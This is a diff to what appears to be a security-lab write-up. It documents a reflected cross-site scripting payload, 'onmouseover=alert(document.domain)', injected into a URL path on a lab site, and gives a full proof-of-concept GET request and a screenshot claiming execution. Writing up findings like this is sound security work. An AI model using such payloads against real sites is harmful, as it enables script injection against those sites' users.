@@ -22,7 +22,12 @@ https://labs.krazeplanet.com/59.php/svc/shreddit/api/comments/askreddit/t3_u9po1
 
 t3_u9po1l%20onmouseover=alert(document.domain)%20y=
 
-## Proof of Concept Request
+# Proof of Concept
+## Screenshot 1 — Successful execution of the injected payload
+
+![Payload Execution](screenshots/lab59.png)
+
+This confirms the existence of the identified vulnerability.
 
 http
 GET /59.php/svc/shreddit/api/comments/askreddit/t3_u9po1l%20onmouseover=alert(document.domain)%20y= HTTP/1.1
